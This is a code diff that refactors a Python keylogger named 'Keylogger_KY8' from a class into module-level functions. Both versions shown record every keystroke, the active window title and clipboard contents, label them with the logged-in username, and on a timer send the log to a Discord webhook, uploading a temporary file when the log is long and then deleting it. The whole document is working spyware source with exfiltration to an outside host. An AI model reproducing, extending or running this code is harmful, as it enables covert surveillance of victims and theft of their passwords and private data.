@@ -30,7 +30,6 @@ SPECIAL_KEYS = {
     Key.f1: " [F1] ",
     Key.f10: " [F10] ",
     Key.f11: " [F11] ",
-    Key.f12: " [F12] ",
     Key.f2: " [F2] ",
     Key.f3: " [F3] ",
     Key.f4: " [F4] ",
@@ -61,83 +60,84 @@ SPECIAL_KEYS = {
     Key.media_previous: " [Previous Track] ",
     Key.media_play_pause: " [Play/Pause] "
 }
+log = ""
+start_time = ""
+end_time = ""
+username = getlogin()
 
-class Keylogger_KY8:
-    def __init__(self, interval, report_method="webhook"):
-        now = datetime.now()
-        self.interval = interval
-        self.report_method = report_method
-        self.log = ""
-        self.start_time = now.strftime('%d/%m/%Y %H:%M')
-        self.end_time = now.strftime('%d/%m/%Y %H:%M')
-        self.username = getlogin()
-        add_hotkey("ctrl+v", self.copy_clipboard, suppress=False)
+def get_active_window():
+    try:
+        return GetWindowText(GetForegroundWindow())
+    except Exception:
+        return "Unknown Window"
 
-    def get_active_window(self):
-        try:
-            return GetWindowText(GetForegroundWindow())
-        except Exception:
-            return "Unknown Window"
+def log_window_change():
+    global current_window
+    new_window = get_active_window()
+    if new_window != current_window and new_window.strip():
+        current_window = new_window
+        global log
+        log += f"\n{"=" * 50}\nWindow title: {current_window}\n"
 
-    def log_window_change(self):
-        global current_window
-        new_window = self.get_active_window()
-        if new_window != current_window and new_window.strip():
-            current_window = new_window
-            self.log += f"\n{"=" * 50}\nWindow title: {current_window}\n"
-
-    def key_handler(self, key):
-        self.log_window_change()
-        try:
-            key = key.char
-            name(key)
-        except (AttributeError, ValueError):
-            if key in SPECIAL_KEYS:
-                key = SPECIAL_KEYS[key]
-            else:
-                key = str(key).find("Key.")
-                if key != -1:
-                    key = str(key).replace("Key.", " [") + "]"
-                else:
-                    key = ""
-        self.log += key
-
-    def copy_clipboard(self):
-        self.log_window_change()
-        self.log += f"\n[Clipboard]: {{\n{paste()}\n}}\n"
-
-    def report_to_webhook(self):
-        webhook = DiscordWebhook(url=WEBHOOK_URL)
-        if len(self.log) > 2000:
-                path = environ["temp"] + "\\log.txt"
-                with open(path, 'w+') as file:
-                    file.write(f"Username :{self.username} | Time: {self.end_time}\n\n")
-                    file.write(self.log)
-                with open(path, 'rb') as f:
-                    webhook.add_file(file=f.read(), filename='log.txt')
-                webhook.execute()
-                remove(path) 
+def key_handler(key):
+    global log
+    log_window_change()
+    try:
+        key = key.char
+        name(key)
+    except (AttributeError, ValueError):
+        if key in SPECIAL_KEYS:
+            key = SPECIAL_KEYS[key]
         else:
-            if len(self.log) > 0:
-                embed = DiscordEmbed(title=f"Username :{self.username} | Time: {self.end_time}", description=self.log)
-                webhook.add_embed(embed)    
+            key = str(key).find("Key.")
+            if key != -1:
+                key = str(key).replace("Key.", " [") + "]"
+            else:
+                key = ""
+    log += key
+
+def copy_clipboard():
+    global log
+    log_window_change()
+    log += f"\n[Clipboard]: {{\n{paste()}\n}}\n"
+
+def send_log_to_webhook():
+    global log, username, end_time
+    webhook = DiscordWebhook(url=WEBHOOK_URL)
+    if len(log) > 2000:
+        path = environ["temp"] + "\\log.txt"
+        with open(path, 'w+') as file:
+            file.write(f"Username :{username} | Time: {end_time}\n\n")
+            file.write(log)
+        with open(path, 'rb') as f:
+            webhook.add_file(file=f.read(), filename='log.txt')
         webhook.execute()
+        try:
+            remove(path)
+        except Exception:
+            pass
+    else:
+        if len(log) > 0:
+            embed = DiscordEmbed(title=f"Username :{username} | Time: {end_time}", description=log)
+            webhook.add_embed(embed)    
+    webhook.execute()
 
-    def report(self):
-        if self.log:
-            if self.report_method == "webhook":
-                self.report_to_webhook()    
-        self.log = ""
-        timer = Timer(interval=self.interval, function=self.report)
-        timer.daemon = True
-        timer.start()
+def schedule_report():
+    global log, username, end_time
+    if log:
+        send_log_to_webhook()
+    log = ""
+    timer = Timer(interval=REPORT_INTERVAL, function=schedule_report)
+    timer.daemon = True
+    timer.start()
 
-    def run(self):
-        self.start_time = datetime.now()
-        with Listener(on_release=self.key_handler) as listener:
-            self.report()
-            listener.join()
+def run_ky8():
+    global start_time, end_time
+    start_time = datetime.now()
+    add_hotkey("ctrl+v", copy_clipboard, suppress=False)
+    with Listener(on_release=key_handler) as listener:
+        schedule_report()
+        listener.join()
 
 if __name__ == "__main__":
-    keylogger = Keylogger_KY8(interval=REPORT_INTERVAL, report_method="webhook")    
-    keylogger.run()
+    run_ky8()
